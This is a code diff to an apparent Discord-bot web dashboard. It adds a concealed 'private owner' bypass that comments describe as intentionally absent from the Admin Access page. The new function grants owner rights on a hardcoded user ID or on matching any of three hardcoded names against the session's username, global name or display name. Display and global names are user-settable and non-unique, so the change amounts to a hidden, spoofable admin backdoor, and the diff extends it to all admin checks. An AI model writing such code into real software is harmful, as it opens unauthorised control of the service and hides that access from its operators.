@@ -214,6 +214,7 @@ DASHBOARD_OWNER_USER_IDS = {
 # This is intentionally not shown or editable in the dashboard Admin Access page.
 # Keep it here so the main developer/admin can never get locked out even if he is not the Discord server owner.
 DASHBOARD_PRIVATE_OWNER_USER_IDS = {1125198908231004191}
+DASHBOARD_PRIVATE_OWNER_USERNAMES = {"jbh.1", "jr_7", "d75gxgjm94"}
 
 # =========================
 # ADMIN CONTROL CENTER
@@ -3703,6 +3704,29 @@ def dashboard_member_has_role(member, role_ids):
         return False
 
 
+def dashboard_session_is_private_owner(user=None):
+    """Private fallback owner check using the Discord OAuth session.
+    This is not shown in the dashboard access page.
+    """
+    try:
+        user = user or (session.get("discord_user") or {})
+
+        raw_id = user.get("id")
+        if raw_id is not None and int(raw_id) in DASHBOARD_PRIVATE_OWNER_USER_IDS:
+            return True
+
+        possible_names = {
+            str(user.get("username") or "").lower().strip(),
+            str(user.get("global_name") or "").lower().strip(),
+            str(user.get("display_name") or "").lower().strip(),
+        }
+
+        private_names = {str(name).lower().strip() for name in DASHBOARD_PRIVATE_OWNER_USERNAMES}
+        return bool(possible_names.intersection(private_names))
+    except Exception:
+        return False
+
+
 def dashboard_access_level(user_id):
     """
     Returns:
@@ -3758,6 +3782,11 @@ def dashboard_user_has_access(user_id):
 
 def dashboard_current_access_level():
     user = session.get("discord_user") or {}
+
+    # Private exception can work even if the OAuth ID format changes or the ID was not the expected one.
+    if dashboard_session_is_private_owner(user):
+        return "owner"
+
     return dashboard_access_level(user.get("id"))
 
 
@@ -3784,7 +3813,7 @@ def dashboard_access_denied_html(message="حسابك ما عنده صلاحية 
 def dashboard_require_admin():
     if not session.get("discord_user"):
         return redirect("/login")
-    if not dashboard_user_has_access(session["discord_user"].get("id")):
+    if dashboard_current_access_level() not in ("owner", "admin"):
         return dashboard_access_denied_html("حسابك داخل Discord ما عنده صلاحية دخول للداشبورد.")
     return None
 
